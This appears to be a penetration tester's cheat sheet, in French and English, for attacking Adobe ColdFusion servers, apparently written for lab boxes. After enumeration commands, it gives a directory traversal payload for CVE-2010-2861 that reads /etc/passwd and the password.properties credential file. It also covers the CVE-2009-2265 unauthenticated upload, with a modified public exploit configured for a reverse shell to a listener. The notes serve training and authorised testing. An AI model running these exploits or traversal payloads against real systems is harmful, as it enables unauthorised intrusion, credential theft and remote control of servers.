
> [!TIP]
> Basé sur Java
> 
> Utilise le ColdFusion Markup Language (similaire au HTLML) pour développer des applications web.
> 

|**Benefits**|**Description**|
|---|---|
|`Developing data-driven web applications`|ColdFusion allows developers to build rich, responsive web applications easily. It offers session management, form handling, debugging, and more features. ColdFusion allows you to leverage your existing knowledge of the language and combines it with advanced features to help you build robust web applications quickly.|
|`Integrating with databases`|ColdFusion easily integrates with databases such as Oracle, SQL Server, and MySQL. ColdFusion provides advanced database connectivity and is designed to make it easy to retrieve, manipulate, and view data from a database and the web.|
|`Simplifying web content management`|One of the primary goals of ColdFusion is to streamline web content management. The platform offers dynamic HTML generation and simplifies form creation, URL rewriting, file uploading, and handling of large forms. Furthermore, ColdFusion also supports AJAX by automatically handling the serialisation and deserialisation of AJAX-enabled components.|
|`Performance`|ColdFusion is designed to be highly performant and is optimised for low latency and high throughput. It can handle a large number of simultaneous requests while maintaining a high level of performance.|
|`Collaboration`|ColdFusion offers features that allow developers to work together on projects in real-time. This includes code sharing, debugging, version control, and more. This allows for faster and more efficient development, reduced time-to-market and quicker delivery of projects.|

- [ ] [[#ENUMERATION MANUELLE]]
- [ ] [[#EXPLOITATION]]


---

# ENUMERATION MANUELLE

Ports par défaut

|Port Number|Protocol|Description|
|---|---|---|
|80|HTTP|Used for non-secure HTTP communication between the web server and web browser.|
|443|HTTPS|Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.|
|1935|RPC|Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device.|
|25|SMTP|Simple Mail Transfer Protocol (SMTP) is used for sending email messages.|
|8500|SSL|Used for server communication via Secure Socket Layer (SSL).|
|5500|Server Monitor|Used for remote administration of the ColdFusion server.|

## Identifier ColdFusion

Coldfusion présent dans le header de la réponse

```bash
curl <url> --head
```

Extensions de pages en .cfm / .cfc

```bash
ffuf -u http://127.0.0.1:8080/FUZZ.cfm -w /usr/share/wordlists/dirb/big.txt
```

```bash
ffuf -u http://127.0.0.1:8080/FUZZ.cfc -w /usr/share/wordlists/dirb/big.txt
```

## Page de Login (indique la version egalement)

```bash
curl http://test.htb:8500/CFIDE/administrator/
```

---

# EXPLOITATION


[[#Tester Weak credentials / Credential stuffing]]
[[#CVEs]]
[[#Direcory Traversal ( < 9.0.2 )]]
[[#Unauthenticated RCE (ver 8)]]


## Tester Weak credentials / Credential stuffing

admin:admin, admin:password....
### Credential Stuffing (Liste de default creds)

Resources:

https://www.cirt.net/passwords
https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv
https://github.com/ihebski/DefaultCreds-cheat-sheet/tree/main



## CVEs

```bash
searchsploit coldfusion
```

## Direcory Traversal ( < 9.0.2 )

**CVE-2010-2861**

paramètre 'locale' sur ces endpoints:

- `CFIDE/administrator/settings/mappings.cfm`
- `logging/settings.cfm`
- `datasources/index.cfm`
- `j2eepackaging/editarchive.cfm`
- `CFIDE/administrator/enter.cfm`

ex:
```http
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

Exploit publique:

```bash
searchsploit -m multiple/remote/14641.py
```

Lire le contenu de password.properties (contient des mots de passes chiffrés pour des services)

```shell
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```


## Unauthenticated RCE (ver 8)

**CVE-2009-2265**

```http
http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

Reverse Shell

```shell
searchsploit -m 50057
```

Modifier l'exploit

```python
if __name__ == '__main__':
    # Define some information
    lhost = 'ip_listener' # 
    lport = port_listener # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```

Exploit

```shell
python3 50057.py 
```